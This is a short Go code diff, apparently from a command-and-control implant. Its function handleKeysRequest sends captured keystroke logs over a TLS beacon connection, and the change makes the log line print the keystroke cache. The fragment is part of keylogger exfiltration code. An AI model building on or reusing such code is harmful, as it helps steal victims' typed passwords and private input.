@@ -287,7 +287,7 @@ func handleError(beacon *tls.Conn, reqType string, err error) {
 }
 
 func handleKeysRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
-	logger.Logf(logger.Info, "Sending keylogs")
+	logger.Logf(logger.Info, "Sending keylogs: %v", cache)
 	keyResponse := types.KeysRequest{
 		AgentID: agentID,
 		Keys: cache,
